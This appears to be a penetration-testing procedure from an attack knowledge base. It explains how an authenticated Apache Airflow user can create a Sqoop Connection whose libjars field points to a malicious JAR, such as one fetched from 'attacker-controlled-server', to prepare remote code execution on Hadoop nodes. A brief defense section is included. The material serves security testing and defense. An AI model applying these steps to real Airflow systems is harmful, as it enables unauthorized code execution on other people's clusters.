---
id: proc-create-malicious-connection
tags:
  - airflow
  - sqoop
  - connection
  - libjars
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:23:41.331Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Create-Malicious-Sqoop-Connection-in-Airflow

## Summary

This procedure allows an authenticated user in Apache Airflow to create a Sqoop Connection with a malicious libjars parameter, setting the stage for remote code execution by pointing to an arbitrary JAR file containing harmful payloads.

## Description

In Apache Airflow Sqoop Provider 3.1.0, the SqoopHook does not validate the libjars field in Connections, enabling users to specify paths to malicious JARs. These JARs are added to the classpath via the -libjars Sqoop option during MapReduce tasks, leading to code execution on Hadoop nodes. This requires Airflow web UI access and assumes the attacker can host or access a malicious JAR (e.g., via a controlled server). Expected outcome: A persistent Connection that can be referenced in DAGs for exploitation.

## Requirements

1. Authenticated access to Airflow web UI (user role with Connection create permissions)
2. Access to host a malicious JAR file (e.g., internal network share or HTTP server)
3. Knowledge of Sqoop Connection schema in Airflow

## Defense

Defensive measures and detection strategies:

- Implement input validation or allowlisting for libjars paths in Sqoop Connections
- Restrict Connection creation to admins only
- Monitor Airflow logs for unusual libjars paths and audit Connection configurations

## Objectives

1. Establish a malicious Connection for later DAG exploitation
2. Bypass validation to inject arbitrary JAR paths
3. Prepare for RCE on MapReduce execution

## Instructions

### Step 1: Access Airflow Connections UI

**Context**: Log in to the Airflow web interface and navigate to the Connections management section to create a new entry.

No specific command; use the UI: Go to Admin > Connections > Create.

> Select Sqoop as the connection type. Fill in required fields like host (e.g., Hadoop cluster address) and leave others default.

### Step 2: Set Malicious libjars Parameter

**Context**: In the Extra field or dedicated libjars parameter (depending on UI version), input the path to the malicious JAR.

No command; UI input: Set libjars to `http://attacker-controlled-server/malicious.jar` or a file path like `/path/to/malicious.jar` where the JAR contains code to execute commands (e.g., Runtime.exec("whoami"))

> Save the Connection. Verify by editing it to ensure the path persists without sanitization.

### Step 3: Verify Connection Creation

**Context**: Test the Connection in a non-exploitative way if possible, or inspect via Airflow CLI.

Use Airflow CLI (if accessible): `airflow connections list | grep sqoop-malicious`

> Expected: Connection listed with libjars field intact.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[airflow]]
- [[sqoop]]
- [[rce]]
